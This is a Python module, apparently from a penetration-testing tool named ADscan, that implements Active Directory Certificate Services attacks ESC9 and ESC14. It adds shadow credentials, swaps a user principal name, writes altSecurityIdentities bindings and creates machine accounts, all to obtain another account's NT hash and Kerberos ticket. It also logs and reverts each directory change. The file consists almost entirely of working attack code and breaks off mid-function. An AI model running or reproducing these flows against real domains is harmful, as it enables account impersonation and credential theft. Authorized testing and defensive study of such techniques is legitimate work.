"""ESC9 (UPN swap) and ESC14 (altSecurityIdentities) exploitation flows."""

from __future__ import annotations

import asyncio
from pathlib import Path
from typing import Optional

from adscan_internal import telemetry
from adscan_internal.rich_output import (
    print_error,
    print_info,
    print_success,
)
from adscan_internal.services.adcs.cert_auth import (
    CertAuthConfig,
    authenticate_with_cert_native,
)
from adscan_internal.services.adcs.cert_request import (
    CertRequestConfig,
    request_certificate_native,
)
from adscan_internal.services.adcs.esc_cleanup import (
    esc_revert_ldap_change,
    esc_rollback_scope,
    register_ldap_change,
)
from adscan_internal.services.adcs.esc_types import EscConfig, EscResult
from adscan_internal.services.ldap_transport_service import (
    ADscanLDAPConfig,
    ADscanLDAPConnection,
)
from adscan_internal.services.cleanup_verification import (
    VERIFY_ACCOUNT_DELETED,
    VERIFY_ALTSECID,
    VERIFY_ATTRIBUTE,
    VERIFY_UPN,
    verify_machine_account_deleted,
)
from adscan_internal.services.machine_account_provisioning_service import (
    POLICY_RETAIN_ONE,
    POLICY_REVERT_EACH_RUN,
    acquire_controlled_machine_account,
    forget_machine_account,
)
from adscan_core.rich_output import print_exception


def _ldap_cfg(config: EscConfig) -> ADscanLDAPConfig:
    return ADscanLDAPConfig(
        domain=config.auth_domain,
        dc_ip=config.dc_ip,
        username=config.username,
        password=config.effective_secret,
        use_ldaps=True,
        use_kerberos=False,
        kerberos_target_hostname=config.dc_fqdn or None,
    )


def _revert_ldap_change(
    config: EscConfig,
    *,
    change_id: Optional[str],
    purpose: str,
    revert,
    verify,
    verification_method: str,
    manual_instructions: str,
    object_dn: str,
    description: str,
    elevated_ccache: Optional[str] = None,
) -> bool:
    """Undo one LDAP write of an ESC step through the shared revert precedence.

    Thin delegate to :func:`esc_cleanup.esc_revert_ldap_change` that binds this
    module's LDAP transport (resolved at call time, so it stays patchable).
    Synchronous: call through ``asyncio.to_thread``.
    """
    return esc_revert_ldap_change(
        config,
        change_id=change_id,
        purpose=purpose,
        revert=revert,
        verify=verify,
        verification_method=verification_method,
        manual_instructions=manual_instructions,
        object_dn=object_dn,
        description=description,
        elevated_ccache=elevated_ccache,
        connect=lambda ldap_cfg: ADscanLDAPConnection(ldap_cfg),
    )


def _manual_machine_account_instructions(
    computer_name: str, computer_dn: str
) -> str:
    """Manual-cleanup disclosure for a machine account ADscan could not delete.

    Names the exact object and the native command a privileged administrator runs
    to remove it, rendered from the cleanup-taxonomy SSOT so the wording matches
    every other machine-account disclosure in the ledger.
    """
    from adscan_internal.services import cleanup_taxonomy as _tax

    command = _tax.MANUAL_MACHINE_ACCOUNT.replace(
        "TARGET", computer_name or computer_dn
    )
    return f"{command}\n  Object: {computer_dn}"


async def _delete_machine_account_with_cascade(
    config: EscConfig,
    *,
    computer_name: str,
    computer_dn: str,
    change_id: Optional[str],
    elevated_ccache: Optional[str] = None,
) -> bool:
    """Delete an ESC14-created machine account through the shared revert precedence.

    The client cleanup account, a verified privileged credential, the
    compromised target's ticket when held, then the creator (which usually
    lacks Delete on the object it created). Each principal once, each attempt
    recorded, and only a re-read that no longer finds the account confirms it.
    Returns True once the object is gone. When nothing can delete it the entry
    is ``manual_required`` with the exact object and the native command; that
    disclosure is the legally-critical floor.
    """
    confirmed = await asyncio.to_thread(
        _revert_ldap_change,
        config,
        change_id=change_id,
        purpose="computer_account_created",
        revert=lambda conn: bool(conn.delete(computer_dn)),
        verify=lambda conn: verify_machine_account_deleted(
            conn, sam_account_name=computer_name
        ),
        verification_method=VERIFY_ACCOUNT_DELETED,
        manual_instructions=_manual_machine_account_instructions(computer_name, computer_dn),
        object_dn=computer_dn,
        description="Computer account delete",
        elevated_ccache=elevated_ccache,
    )
    if confirmed:
        # The object is gone: drop it (and its password) from the credential
        # store and the managed registry so no later step reuses it.
        _forget_deleted_machine_account(config, computer_name)
        print_success(f"ESC14: computer {computer_name} deleted.")
        return True
    print_error(
        f"ESC14: could not delete computer {computer_name} with any credential "
        "this session holds. Manual cleanup required (disclosed in the "
        "environment-change ledger)."
    )
    return False


def _forget_deleted_machine_account(config: EscConfig, computer_name: str) -> None:
    """Remove a deleted machine account from every place a later step reads it."""
    try:
        forget_machine_account(
            config.shell, domain=config.domain, sam_account_name=computer_name
        )
    except Exception as exc:  # noqa: BLE001 - bookkeeping never fails the revert
        telemetry.capture_exception(exc)
        print_exception(exception=exc)


def _output_dir(config: EscConfig) -> Path:
    d = Path(config.workspace_dir or "/tmp") / "adcs" / f"esc{config.esc}"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _read_upn(conn: ADscanLDAPConnection, account_dn: str) -> Optional[str]:
    conn.search(
        search_base=account_dn,
        search_filter="(objectClass=*)",
        attributes=["userPrincipalName"],
        search_scope="BASE",
    )
    if not conn.entries:
        return None
    raw = conn.entries[0].entry_raw_attributes.get("userPrincipalName") or []
    if not raw:
        return None
    v = raw[0]
    return v.decode() if isinstance(v, bytes) else str(v)


def _set_upn(conn: ADscanLDAPConnection, account_dn: str, upn: str) -> bool:
    return conn.modify(account_dn, {"userPrincipalName": [("replace", [upn])]})


def _read_attribute(
    conn: ADscanLDAPConnection, account_dn: str, attribute: str
) -> Optional[str]:
    """Read a single-valued string attribute of ``account_dn`` (``None`` if absent)."""
    conn.search(
        search_base=account_dn,
        search_filter="(objectClass=*)",
        attributes=[attribute],
        search_scope="BASE",
    )
    if not conn.entries:
        return None
    raw = conn.entries[0].entry_raw_attributes.get(attribute) or []
    if not raw:
        return None
    value = raw[0]
    return value.decode() if isinstance(value, bytes) else str(value)


def _replace_attribute(
    conn: ADscanLDAPConnection, account_dn: str, attribute: str, value: str
) -> bool:
    """Set ``attribute`` of ``account_dn`` to ``value`` (single-value replace)."""
    return bool(conn.modify(account_dn, {attribute: [("replace", [value])]}))


def _restore_attribute(
    conn: ADscanLDAPConnection,
    account_dn: str,
    attribute: str,
    original_value: Optional[str],
) -> bool:
    """Restore ``attribute`` to its snapshot — replace the original, or delete it."""
    if original_value is not None:
        return bool(conn.modify(account_dn, {attribute: [("replace", [original_value])]}))
    return bool(conn.modify(account_dn, {attribute: [("delete", [])]}))


def _add_shadow_creds(config: EscConfig):
    """Add shadow credentials to target_account and return NT hash via PKINIT."""
    from adscan_internal.services.adcs.shadow_credentials import (
        add_shadow_credentials_native,
    )

    return add_shadow_credentials_native(
        dc_ip=config.dc_ip,
        domain=config.auth_domain,
        username=config.username,
        password=config.effective_secret or "",
        target_account=config.target_account,
    )


def _remove_shadow_creds(
    config: EscConfig, *, change_id: Optional[str], key_credential_value: str
) -> bool:
    """Remove ONLY the key credential ESC9 added, through the shared revert.

    Same executor as the exit cleanup and the final retry pass (the shared
    revert precedence, each attempt recorded, a confirming re-read). Sibling
    values on ``msDS-KeyCredentialLink`` (Windows Hello for Business keys, for
    instance) are never touched. Synchronous; returns True when confirmed.
    """
    from adscan_internal.services.acl_change_cleanup_service import (  # noqa: PLC0415
        revert_acl_change_now,
    )

    return revert_acl_change_now(
        config.shell,
        action={
            "kind": "shadow_credentials_added",
            "domain": config.auth_domain or config.domain,
            "target_domain": config.domain,
            "target": config.target_account,
            "exec_username": config.username,
            "exec_password": config.effective_secret or "",
            "added_key_credential_value": key_credential_value,
            "_ledger_change_id": change_id,
        },
    )


def _read_attribute_values(
    conn: ADscanLDAPConnection, account_dn: str, attribute: str
) -> list[str]:
    """Read every value of a multi-valued string attribute of ``account_dn``."""
    conn.search(
        search_base=account_dn,
        search_filter="(objectClass=*)",
        attributes=[attribute],
        search_scope="BASE",
    )
    if not conn.entries:
        return []
    raw = conn.entries[0].entry_raw_attributes.get(attribute) or []
    return [v.decode() if isinstance(v, bytes) else str(v) for v in raw]


def _same_value(current: Optional[str], expected: Optional[str]) -> bool:
    """Directory string equality (case-insensitive; absent equals empty)."""
    return str(current or "").strip().lower() == str(expected or "").strip().lower()


def _acquire_machine_account(
    config: EscConfig, ldap_cfg: ADscanLDAPConfig, *, purpose: str, method: str
):
    """Get the step's computer account through the provisioning SSOT.

    Synchronous (it drives its own event loop): call through
    ``asyncio.to_thread``. ``acquire_controlled_machine_account`` re-reads the
    actor's capacity, reuses the retained account under ``retain_one`` and
    otherwise creates ``ADSCAN`` + 8 hex, recording the ledger entry and the
    managed registry. Returns the lease, or ``None`` (reason already printed).
    """
    return acquire_controlled_machine_account(
        config.shell,
        domain=config.domain,
        actor_ldap_config=ldap_cfg,
        actor_username=str(config.username or ""),
        purpose=purpose,
        method=method,
        step_scoped=True,
        ledger_kind="computer_account_created",
        respect_capacity=True,
    )


def _lease_is_step_scoped(lease) -> bool:
    """True when the step created the account and must delete it at its end.

    The retained account (reused, or created now under ``retain_one``) is kept
    for later runs and disclosed as such; deleting it would defeat the policy.
    """
    return bool(getattr(lease, "created", False)) and (
        getattr(lease, "policy", POLICY_REVERT_EACH_RUN) != POLICY_RETAIN_ONE
    )


_NO_MACHINE_ACCOUNT_ERROR = (
    "No computer account available for the step (MachineAccountQuota exhausted, "
    "or the domain controller refused the creation)."
)


async def run_esc9(config: EscConfig) -> EscResult:
    """ESC9: shadow creds on target -> get NT hash -> swap UPN -> request cert -> restore UPN."""
    out = _output_dir(config)
    ldap_cfg = _ldap_cfg(config)

    # Step 1: Add shadow credentials to get the target's NT hash
    shadow = await asyncio.to_thread(_add_shadow_creds, config)
    added_key = getattr(shadow, "added_key_credential_value", None)
    if not isinstance(added_key, str) or not added_key:
        added_key = None

    # Disclose the write WHENEVER the key credential landed, independent of
    # success: a write followed by a PKINIT failure leaves it on the account.
    sc_change_id = None
    if added_key:
        sc_change_id = register_ldap_change(
            config.shell,
            kind="shadow_credentials_added",
            domain=config.domain,
            target=config.target_account,
            detail={
                "target": config.target_account,
                "target_object": config.target_account,
                "target_user": config.target_account,
                "target_domain": config.domain,
                "exec_user": config.username,
                "exec_username": config.username,
                "executor_username": config.username,
                "executor_auth_domain": config.auth_domain or config.domain,
                "added_key_credential_value": added_key,
            },
            method="ADCSESC9 — shadow credentials",
        )

    shadow_revert_ran = False

    async def _rm_shadow() -> None:
        nonlocal shadow_revert_ran
        if shadow_revert_ran or not added_key:
            return
        shadow_revert_ran = True
        print_info(
            f"ESC9: removing the shadow credential added to {config.target_account}..."
        )
        if await asyncio.to_thread(
            _remove_shadow_creds,
            config,
            change_id=sc_change_id,
            key_credential_value=added_key,
        ):
            print_success("ESC9: shadow credential removed.")
        else:
            print_error(
                "ESC9: the shadow credential could not be removed with any credential "
                "this session holds. Manual cleanup required (disclosed in the "
                "environment-change ledger)."
            )

    if not getattr(shadow, "success", False):
        await _rm_shadow()
        inner = getattr(shadow, "error", None) or "operation failed"
        return EscResult(
            success=False,
            esc=9,
            error=f"shadow credentials failed: {inner}",
        )

    nt_hash = getattr(shadow, "nt_hash", None)

    upn_restored = False
    upn_revert_ran = False

    async with esc_rollback_scope() as rb:

        rb.add(_rm_shadow)

        # Step 2: Read current UPN so we can restore it
        def _get_upn() -> Optional[str]:
            with ADscanLDAPConnection(ldap_cfg) as conn:
                return _read_upn(conn, config.target_account_dn)

        original_upn = await asyncio.to_thread(_get_upn)
        # original_upn may be None if the account has no UPN set — that's OK,
        # we'll set it and restore to empty on rollback.

        upn_change_id = register_ldap_change(
            config.shell,
            kind="upn_changed",
            domain=config.domain,
            target=config.target_account,
            detail={
                "original_upn": original_upn,
                "new_upn": config.target_upn,
                "dn": config.target_account_dn,
            },
            method="ADCSESC9 — UPN manipulation",
        )

        async def _restore_upn() -> None:
            nonlocal upn_restored, upn_revert_ran
            if upn_revert_ran:
                return
            upn_revert_ran = True
            _upn_display = repr(original_upn) if original_upn else "(none)"
            print_info(
                f"ESC9: restoring UPN of {config.target_account} -> {_upn_display}..."
            )
            account_dn = config.target_account_dn

            def _revert(conn: ADscanLDAPConnection) -> bool:
                if original_upn:
                    return _set_upn(conn, account_dn, original_upn)
                # No original UPN: delete the attribute.
                return bool(
                    conn.modify(account_dn, {"userPrincipalName": [("delete", [])]})
                )

            ok = await asyncio.to_thread(
                _revert_ldap_change,
                config,
                change_id=upn_change_id,
                purpose="upn_changed",
                revert=_revert,
                verify=lambda conn: _same_value(_read_upn(conn, account_dn), original_upn),
                verification_method=VERIFY_UPN,
                manual_instructions=(
                    f"Manually set userPrincipalName={original_upn} on {account_dn}"
                    if original_upn
                    else f"Manually clear userPrincipalName on {account_dn}"
                ),
                object_dn=account_dn,
                description="UPN restore",
            )
            if ok:
                upn_restored = True
                print_success("ESC9: UPN restored.")
            else:
                print_error("ESC9: UPN restore failed (manual cleanup required).")

        rb.add(_restore_upn)

        # Step 3: Swap UPN to target's value so the cert embeds the target identity
        print_info(
            f"ESC9: changing {config.target_account} UPN -> {config.target_upn}..."
        )

        def _set_target_upn() -> bool:
            with ADscanLDAPConnection(ldap_cfg) as conn:
                return _set_upn(conn, config.target_account_dn, config.target_upn)

        ok = await asyncio.to_thread(_set_target_upn)
        if not ok:
            raise RuntimeError(f"Failed to set UPN on {config.target_account_dn}")

        # Step 4: Request certificate — authenticate as target_account using NT hash
        _esc9_key_size = getattr(config, "min_key_size", None)
        req_cfg = CertRequestConfig(
            domain=config.auth_domain,
            kdc_ip=config.auth_kdc,
            ca_host=config.ca_host,
            ca_name=config.ca_name,
            template=config.template or "User",
            username=config.target_account,
            nt_hash=nt_hash,
            ca_fqdn=config.ca_fqdn,
            auth_domain=config.auth_domain,
            target_domain=config.domain,
            auth_kdc_ip=config.auth_kdc,
            target_kdc_ip=config.dc_ip,
            dns_server=config.dns_server,
            ledger_shell=config.shell,
            ledger_domain=config.domain,
            ledger_technique="ADCSESC9: certificate enrollment under the swapped UPN",
            **({} if _esc9_key_size is None else {"key_size": int(_esc9_key_size)}),
        )
        req = await request_certificate_native(req_cfg, out)
        if not req.success:
            await _restore_upn()
            await _rm_shadow()
            return EscResult(
                success=False,
                esc=9,
                error=f"Certificate request failed: {req.error}",
                rollback_ok=upn_restored,
            )

        # Step 5: Restore before PKINIT so environment is clean regardless of outcome
        await _restore_upn()
        await _rm_shadow()

        # Step 6: PKINIT with the obtained cert to get the target's hash
        auth_cfg = CertAuthConfig(
            domain=config.domain,
            kdc_ip=config.dc_ip,
            pfx_path=req.pfx_path,
            pfx_password=req.pfx_password or "",
            username=config.target_upn.split("@")[0] if config.target_upn else None,
        )
        auth = await authenticate_with_cert_native(auth_cfg, out)
        if not auth.success:
            if getattr(auth, "certificate_binding_refused", False):
                # The DC enforces strong certificate binding (KB5014754): ESC9's
                # premise (a no-SID certificate implicitly mapped by UPN) is
                # refused. This is the mitigation working, so it is an honest
                # HARDENED positive control, not a failed attempt — mirror the
                # ESC15 confirm vocabulary (evidence verdict "hardened").
                return EscResult(
                    success=False,
                    esc=9,
                    error=auth.error or "PKINIT refused by strong certificate binding",
                    rollback_ok=upn_restored,
                    evidence={
                        "verdict": "hardened",
                        "certificate_binding_refused": True,
                        "reason": auth.error
                        or "the domain controller enforces strong certificate binding",
                    },
                )
            return EscResult(
                success=False,
                esc=9,
                error=auth.error or "PKINIT failed",
                rollback_ok=upn_restored,
            )

        print_success(f"ESC9: NT hash obtained — {auth.nt_hash}")
        from adscan_internal.services.adcs.esc_enrollment import _emit_pkinit_compromise

        _emit_pkinit_compromise(config, auth.nt_hash)
        return EscResult(
            success=True,
            esc=9,
            nt_hash=auth.nt_hash,
            ccache_path=str(auth.ccache_path) if auth.ccache_path else None,
            pfx_path=str(req.pfx_path),
        )


def compute_x509_issuer_serial(cert_der: bytes) -> str:
    """Compute X509IssuerSerialNumber binding value for altSecurityIdentities.

    Format: ``X509:<I>issuer_root_first<SR>hex_serial_reversed``

    Windows ``altSecurityIdentities`` X509IssuerSerialNumber requires the issuer
    distinguished name in **root-first (DER / forward) order** — the root RDN
    first, the leaf (CN) last (e.g. ``DC=local,DC=essos,CN=ESSOS-CA``). This is the
    REVERSE of ``Name.rfc4514_string()``, which renders leaf-first per RFC 4514 and
    the KDC rejects with ``KDC_ERR_CLIENT_NAME_MISMATCH`` (code 75). We therefore
    render the issuer by joining each RDN in the certificate's native DER order
    (``cert.issuer.rdns``) directly, rather than ``rfc4514_string()``. Each RDN is
    rendered via its own ``rfc4514_string()`` so values containing escaped commas
    stay correctly escaped — a naive ``split(',')`` on the whole-DN string would
    corrupt them. The serial stays little-endian (unchanged) and case is left as-is
    (AD matches the issuer DN case-insensitively).

    Args:
        cert_der: DER-encoded X.509 certificate bytes.

    Returns:
        The altSecurityIdentities binding string.
    """
    from cryptography import x509 as _x509

    cert = _x509.load_der_x509_certificate(cert_der)
    # cert.issuer.rdns is the native DER order (root-first for a real CA cert);
    # rfc4514_string() reverses it to leaf-first, which the KDC refuses. Render each
    # RDN individually (preserving per-value escaping) and keep the DER order.
    issuer_root_first = ",".join(
        rdn.rfc4514_string() for rdn in cert.issuer.rdns
    )
    serial_bytes = cert.serial_number.to_bytes(
        (cert.serial_number.bit_length() + 7) // 8, "big"
    )
    serial_hex = serial_bytes[::-1].hex().upper()
    return f"X509:<I>{issuer_root_first}<SR>{serial_hex}"


def _resolve_sid(ldap_cfg: "ADscanLDAPConfig", target_account: str) -> Optional[str]:
    """Look up the objectSid of the target account for embedding in the cert."""
    try:
        with ADscanLDAPConnection(ldap_cfg) as conn:
            conn.search(
                search_base=conn.domain_dn,
                search_filter=f"(sAMAccountName={target_account})",
                attributes=["objectSid"],
            )
            if not conn.entries:
                return None
            raw_sid = conn.entries[0].entry_raw_attributes.get("objectSid") or []
            if not raw_sid or not isinstance(raw_sid[0], bytes):
                return None
            from adscan_internal.services.writable_attribute_discovery_service import (
                _sid_bytes_to_str,
            )

            return _sid_bytes_to_str(raw_sid[0]) or None
    except Exception:  # noqa: BLE001
        return None


async def run_esc14(config: EscConfig) -> EscResult:
    """ESC14 dispatch: variant A writes the target; B/C/D satisfy an existing mapping.

    * Variant A (default) — a controlling principal writes a strong binding onto
      the TARGET's altSecurityIdentities and enrolls a certificate it controls.
    * Variants B/C/D — the target ALREADY carries a weak explicit mapping
      (email / issuer+subject / subject-only). ADscan creates a controlled victim
      machine account, sets its ``mail`` / ``cn`` / ``dNSHostName`` to satisfy that
      mapping, enrolls as the victim, and the domain controller maps the issued
      certificate to the target. Delegated to :func:`run_esc14_weak_mapping`.
    """
    variant = str(getattr(config, "esc14_variant", "A") or "A").strip().upper()
    if variant in {"B", "C", "D"}:
        return await run_esc14_weak_mapping(config)
    return await _run_esc14_write_access(config)


async def _run_esc14_write_access(config: EscConfig) -> EscResult:
    """ESC14 variant A: create computer -> request Machine cert with target SID -> altSecId -> PKINIT."""
    out = _output_dir(config)
    ldap_cfg = _ldap_cfg(config)

    print_info("ESC14: obtaining a computer account...")
    lease = await asyncio.to_thread(
        _acquire_machine_account,
        config,
        ldap_cfg,
        purpose="adcs_esc14",
        method="ADCSESC14 — computer account creation",
    )
    if lease is None:
        return EscResult(success=False, esc=14, error=_NO_MACHINE_ACCOUNT_ERROR)

    computer_name: str = lease.sam_account_name
    computer_password: str = lease.password
    computer_dn: str = lease.dn or ""
    comp_change_id = lease.ledger_change_id
    delete_computer_at_end = _lease_is_step_scoped(lease)

    computer_deleted = False
    altsec_cleared = False
    altsec_revert_ran = False
    # Set after PKINIT succeeds: the impersonated target's ccache. It is ONE of the
    # credentials the delete cascade may authenticate as, not a privileged one by
    # assumption (variant A routinely impersonates an ordinary Tier-2 account) —
    # see :func:`_delete_machine_account_with_cascade`.
    elevated_delete_ccache: Optional[str] = None

    async with esc_rollback_scope() as rb:

        async def _delete_computer() -> None:
            nonlocal computer_deleted
            if computer_deleted or not delete_computer_at_end:
                return
            print_info(f"ESC14: deleting computer account {computer_name}...")
            if await _delete_machine_account_with_cascade(
                config,
                computer_name=computer_name,
                computer_dn=computer_dn,
                change_id=comp_change_id,
                elevated_ccache=elevated_delete_ccache,
            ):
                computer_deleted = True

        rb.add(_delete_computer)

        # Step 2: Resolve target SID for embedding in cert (Strong Certificate Binding support).
        target_sid = await asyncio.to_thread(
            _resolve_sid, ldap_cfg, config.target_account
        )

        # Step 3: Request Machine certificate for the new computer account.
        # ESC14 variant A is defined by the strong altSecurityIdentities binding we
        # write on the target, NOT a SAN UPN. A SAN UPN would make the KDC map the
        # certificate by implicit UPN (ESC1-style) and ignore the binding entirely —
        # on a group terminal that is KDC_ERR_C_PRINCIPAL_UNKNOWN. So enroll with NO
        # SAN UPN; the SID is kept (it is the target's own SID) so PKINIT still works
        # on patched DCs that enforce Strong Certificate Binding.
        print_info(f"ESC14: requesting Machine certificate for {computer_name}...")
        _esc14_key_size = getattr(config, "min_key_size", None)
        req_cfg = CertRequestConfig(
            domain=config.auth_domain,
            kdc_ip=config.auth_kdc,
            ca_host=config.ca_host,
            ca_name=config.ca_name,
            template="Machine",
            username=computer_name,
            password=computer_password,
            ca_fqdn=config.ca_fqdn,
            upn="",
            sid=target_sid,
            dns_server=config.dns_server,
            ledger_shell=config.shell,
            ledger_domain=config.domain,
            ledger_technique="ADCSESC14: machine certificate enrollment",
            **({} if _esc14_key_size is None else {"key_size": int(_esc14_key_size)}),
        )
        req = await request_certificate_native(req_cfg, out)
        if not req.success:
            raise RuntimeError(f"Machine cert request failed: {req.error}")

        # Step 3: Compute altSecurityIdentities binding value from the cert
        from cryptography.hazmat.primitives.serialization import Encoding
        from cryptography.hazmat.primitives.serialization.pkcs12 import load_pkcs12

        pfx_bytes = req.pfx_path.read_bytes()
        pfx_data = load_pkcs12(pfx_bytes, (req.pfx_password or "").encode())
        cert_der = pfx_data.cert.certificate.public_bytes(Encoding.DER)
        binding_value = compute_x509_issuer_serial(cert_der)
        print_info(f"ESC14: computed binding value: {binding_value[:60]}...")

        altsec_change_id = register_ldap_change(
            config.shell,
            kind="altsecurityidentities_written",
            domain=config.domain,
            target=config.target_account,
            detail={"target_dn": config.target_account_dn, "binding": binding_value},
            method="ADCSESC14 — altSecurityIdentities write",
        )

        async def _clear_altsec() -> None:
            nonlocal altsec_cleared, altsec_revert_ran
            if altsec_revert_ran:
                return
            altsec_revert_ran = True
            print_info(
                f"ESC14: clearing altSecurityIdentities on {config.target_account}..."
            )
            account_dn = config.target_account_dn

            def _revert(conn: ADscanLDAPConnection) -> bool:
                return bool(
                    conn.modify(
                        account_dn,
                        {"altSecurityIdentities": [("delete", [binding_value])]},
                    )
                )

            def _verify(conn: ADscanLDAPConnection) -> bool:
                values = _read_attribute_values(conn, account_dn, "altSecurityIdentities")
                return not any(_same_value(v, binding_value) for v in values)

            ok = await asyncio.to_thread(
                _revert_ldap_change,
                config,
                change_id=altsec_change_id,
                purpose="altsecurityidentities_written",
                revert=_revert,
                verify=_verify,
                verification_method=VERIFY_ALTSECID,
                manual_instructions=(
                    f"Manually remove {binding_value} from altSecurityIdentities "
                    f"on {account_dn}"
                ),
                object_dn=account_dn,
                description="altSecurityIdentities clear",
                elevated_ccache=elevated_delete_ccache,
            )
            if ok:
                altsec_cleared = True
                print_success("ESC14: altSecurityIdentities cleared.")
            else:
                print_error("ESC14: failed to clear altSecurityIdentities.")

        rb.add(_clear_altsec)

        # Step 4: Write the binding value to the target's altSecurityIdentities
        def _write_altsec() -> bool:
            with ADscanLDAPConnection(ldap_cfg) as conn:
                return conn.modify(
                    config.target_account_dn,
                    {"altSecurityIdentities": [("add", [binding_value])]},
                )

        ok = await asyncio.to_thread(_write_altsec)
        if not ok:
            raise RuntimeError(
                f"Failed to write altSecurityIdentities on {config.target_account_dn}"
            )

        # Step 5: PKINIT as the target account using the machine cert
        auth_cfg = CertAuthConfig(
            domain=config.domain,
            kdc_ip=config.dc_ip,
            pfx_path=req.pfx_path,
            pfx_password=req.pfx_password or "",
            username=config.target_account,
        )
        auth = await authenticate_with_cert_native(auth_cfg, out)
        if not auth.success:
            raise RuntimeError(f"PKINIT failed: {auth.error}")

        # The attack now holds the impersonated target's TGT ccache. The cleanup
        # cascade tries it alongside any verified-privileged credential the session
        # holds, since the target itself may be unprivileged.
        elevated_delete_ccache = str(auth.ccache_path) if auth.ccache_path else None

        # Step 6: Clean up — delete computer and clear altSecurityIdentities
        await _delete_computer()
        await _clear_altsec()

        print_success(f"ESC14: NT hash obtained — {auth.nt_hash}")
        from adscan_internal.services.adcs.esc_enrollment import _emit_pkinit_compromise

        _emit_pkinit_compromise(config, auth.nt_hash)
        return EscResult(
            success=True,
            esc=14,
            nt_hash=auth.nt_hash,
            ccache_path=str(auth.ccache_path) if auth.ccache_path else None,
            pfx_path=str(req.pfx_path),
        )


async def run_esc14_weak_mapping(config: EscConfig) -> EscResult:
    """ESC14 variants B/C/D: satisfy a target's EXISTING weak explicit mapping.

    The target already carries a weak ``altSecurityIdentities`` mapping (email,
    issuer+subject, or subject-only). ADscan does NOT touch the target: it creates
    a controlled victim machine account, sets the victim's ``mail`` (B) / ``cn``
    (C) / ``dNSHostName`` (D) to the value the mapping matches, enrolls a
    certificate as the victim, and the domain controller maps the issued
    certificate to the target — authenticating as the target.

    Every destructive write is on the throwaway victim and is reversible:

    * the victim attribute is SNAPSHOTTED before the write and RESTORED on success
      AND failure (and the victim account is deleted), both through the ledger;
    * a revert that cannot be verified is disclosed ``manual_required`` with the
      exact native command, never left silent.
    """
    variant = str(config.esc14_variant or "").strip().upper()
    attribute = str(config.esc14_victim_attribute or "").strip()
    match_value = str(config.esc14_match_value or "").strip()
    if not attribute or not match_value:
        return EscResult(
            success=False,
            esc=14,
            error=(
                f"ESC14 variant {variant}: missing victim attribute / match value "
                "(re-run collection to resolve the weak mapping)."
            ),
        )

    out = _output_dir(config)
    ldap_cfg = _ldap_cfg(config)

    print_info(f"ESC14 variant {variant}: obtaining a controlled victim computer account...")
    lease = await asyncio.to_thread(
        _acquire_machine_account,
        config,
        ldap_cfg,
        purpose="adcs_esc14_victim",
        method=f"ADCSESC14 variant {variant} — victim machine account creation",
    )
    if lease is None:
        return EscResult(success=False, esc=14, error=_NO_MACHINE_ACCOUNT_ERROR)

    victim_name: str = lease.sam_account_name
    victim_password: str = lease.password
    victim_dn: str = lease.dn or ""
    comp_change_id = lease.ledger_change_id

    try:
        return await _run_esc14_weak_mapping_scoped(
            config,
            out=out,
            ldap_cfg=ldap_cfg,
            variant=variant,
            attribute=attribute,
            match_value=match_value,
            victim_name=victim_name,
            victim_password=victim_password,
            victim_dn=victim_dn,
            comp_change_id=comp_change_id,
            delete_victim_at_end=_lease_is_step_scoped(lease),
        )
    except Exception as exc:  # noqa: BLE001 — rollbacks already ran in the scope
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return EscResult(
            success=False,
            esc=14,
            error=f"ESC14 variant {variant}: {exc}",
            evidence={"esc14_variant": variant},
        )


async def _run_esc14_weak_mapping_scoped(
    config: EscConfig,
    *,
    out: Path,
    ldap_cfg: ADscanLDAPConfig,
    variant: str,
    attribute: str,
    match_value: str,
    victim_name: str,
    victim_password: str,
    victim_dn: str,
    comp_change_id: Optional[str],
    delete_victim_at_end: bool = True,
) -> EscResult:
    """The B/C/D rollback-scoped body (see :func:`run_esc14_weak_mapping`).

    Split out so the caller can convert a mid-chain failure (raised after the
    rollback scope has already restored the victim attribute and deleted the
    victim) into an honest failed :class:`EscResult`, which lets the attack-path
    executor fall back to the next confirmed variant instead of aborting.
    """
    computer_deleted = False
    attribute_restored = False
    attribute_revert_ran = False
    # Set after PKINIT succeeds: the impersonated target's ccache, one of the
    # credentials the delete cascade may authenticate as (see
    # :func:`_delete_machine_account_with_cascade`).
    elevated_delete_ccache: Optional[str] = None

    async with esc_rollback_scope() as rb:

        async def _delete_victim() -> None:
            nonlocal computer_deleted
            if computer_deleted or not delete_victim_at_end:
                return
            print_info(f"ESC14: deleting victim machine account {victim_name}...")
            if await _delete_machine_account_with_cascade(
                config,
                computer_name=victim_name,
                computer_dn=victim_dn,
                change_id=comp_change_id,
                elevated_ccache=elevated_delete_ccache,
            ):
                computer_deleted = True

        rb.add(_delete_victim)

        # Snapshot the victim attribute BEFORE the write (fresh computer: usually
        # absent) so it is restored exactly, then register the reversible change.
        def _snapshot() -> Optional[str]:
            with ADscanLDAPConnection(ldap_cfg) as conn:
                return _read_attribute(conn, victim_dn, attribute)

        original_value = await asyncio.to_thread(_snapshot)

        attr_change_id = register_ldap_change(
            config.shell,
            kind="victim_attribute_written",
            domain=config.domain,
            target=victim_name,
            detail={
                "victim_dn": victim_dn,
                "attribute": attribute,
                "original_value": original_value,
                "written_value": match_value,
                "variant": variant,
            },
            method=f"ADCSESC14 variant {variant} — victim {attribute} write",
        )

        async def _restore_attr() -> None:
            nonlocal attribute_restored, attribute_revert_ran
            if attribute_revert_ran:
                return
            attribute_revert_ran = True
            print_info(
                f"ESC14: restoring {attribute} on victim {victim_name} to its "
                "original value..."
            )

            ok = await asyncio.to_thread(
                _revert_ldap_change,
                config,
                change_id=attr_change_id,
                purpose="victim_attribute_written",
                revert=lambda conn: _restore_attribute(
                    conn, victim_dn, attribute, original_value
                ),
                verify=lambda conn: _same_value(
                    _read_attribute(conn, victim_dn, attribute), original_value
                ),
                verification_method=VERIFY_ATTRIBUTE,
                manual_instructions=(
                    f"Manually restore {attribute} on {victim_dn} to "
                    f"{original_value!r} (or delete it)"
                ),
                object_dn=victim_dn,
                description=f"Victim {attribute} restore",
                elevated_ccache=elevated_delete_ccache,
            )
            if ok:
                attribute_restored = True
                print_success(f"ESC14: victim {attribute} restored.")
            else:
                print_error(f"ESC14: failed to restore victim {attribute}.")

        rb.add(_restore_attr)

        # Write the match value so the victim's enrolled certificate carries the
        # identifier the target's weak mapping matches.
        print_info(
            f"ESC14 variant {variant}: setting victim {attribute} to satisfy the "
            "target's weak certificate mapping..."
        )

        def _write_attr() -> bool:
            with ADscanLDAPConnection(ldap_cfg) as conn:
                return _replace_attribute(conn, victim_dn, attribute, match_value)

        if not await asyncio.to_thread(_write_attr):
            raise RuntimeError(
